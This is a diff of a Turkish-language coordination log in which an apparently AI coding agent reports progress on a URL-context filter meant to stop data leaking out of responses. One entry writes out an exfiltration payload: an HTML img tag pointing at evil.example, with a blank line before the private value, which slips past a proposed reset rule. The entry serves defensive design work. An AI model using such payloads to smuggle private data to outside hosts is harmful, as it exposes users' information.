@@ -1620,3 +1620,16 @@ MAJOR-r2-1/2/3, MINOR-r2-1..7, NOTE-1 kapalı (her biri testli). İnceleyiciye �
 ### A-08T1-0027 · 2026-11-03 18:00 · → koordinator · ACK
 Paket: 08-tam-1a   Cevap: K-08T1-0017
 Alındı: 370912d VERIFIED, r3 delta incelemede; dal donuk, commit yok. Saat damgası notu alındı: A-08T1-0023..0026 damgaları gerçek saatten ~75 dk ileri yazılmıştı; bundan sonra `date` ile yazıyorum. Sonucu bekliyorum.
+
+### A-08T1-0028 · 2026-11-03 19:45 · → koordinator · ACK
+Paket: 08-tam-1a   Cevap: K-08T1-0018
+Alındı: r3 DUZELT (MAJOR-r3-1/2, MINOR-r3-1..6/8, NOTE-1/2). KARARLAR "C17 URL bağlam kuralı, ek" (a)-(f) bağlayıcı kabul. Sıra: MAJOR-r3-2 (artımlı tarama) → MAJOR-r3-1 (HTML etiketi satırı + şema/style/data/url( + satır sonunda öznitelik adı) → MINOR-r3-4 (boş satır sıfırlar) → MINOR-r3-1 (yeniden bağlanan okuyucu) → MINOR-r3-2 (99.999.998) → MINOR-r3-3/6 → NOTE-1 → docs + PR notu. Her biri önce kırmızı test, ayrı commit.
+
+### A-08T1-0029 · 2026-11-03 19:54 · → koordinator · KARAR-GEREK
+Paket: 08-tam-1a r3   Cevap: K-08T1-0018 (MINOR-r3-4, KARARLAR ek (e))
+Durum: MAJOR-r3-2 (1d6e84e) ve MAJOR-r3-1 (0ad2aab) commit'li, testli. (e) uygulanmadan önce bir sızıntı yolu gördüm: HTML tırnaklı öznitelik değeri boş satırı geçebilir ve tarayıcı URL'deki satır sonlarını siler. `<img src="https://evil.example/?q=` + boş satır + `<<PII_1>>">`: 1. satır işaretli; (e) boş satırda açık hedefi kapatırsa 3. satırda işaret yok (şema/etiket 1. satırda kaldı), değer açılır ve dış hosta gider. Kararın gerekçesi ("sonraki satırlarda şema/etiket kuralları yine geçerli") bu biçimde tutmuyor; CommonMark gerekçesi yalnız markdown hedefleri için doğru.
+Seçenekler:
+- **A (önerim):** boş satır yalnız markdown kaynaklı açık hedefi kapatır (`](` paren, `](<`, `]:` sonrası değer bekleniyor). HTML kaynaklı olanlar (açık etiket, etiket içi ya da öznitelik sonrası tırnak, `=` sonrası değer) kapanış karakterine kadar sürer. `_lost` (8.192'yi aşan işaretli satır) boş satırla kapanmaz; durum bilinmiyor. Etki: raporun kullanılabilirlik örnekleri (`[not]: 'tis`, kapanmayan markdown) boş satırla düzelir; HTML'de kapanmayan tırnak cevabın sonuna kadar fail-closed kalır; sızıntı yok.
+- **B:** (e) yazıldığı gibi; boş satır her şeyi kapatır. Etki: yukarıdaki yazım ham HTML işleyen istemcide açık kalır (MAJOR-r2-1 sınıfı).
+- **C:** sıfırlama yok (r3 davranışı). Etki: sızıntı yok, kullanılabilirlik sorunu MINOR-r3-4 olduğu gibi kalır.
+Cevaba kadar diğer maddelerle (MINOR-r3-1/2/3/6, NOTE-1, docs) devam ediyorum; MINOR-r3-4 en sona kaldı.
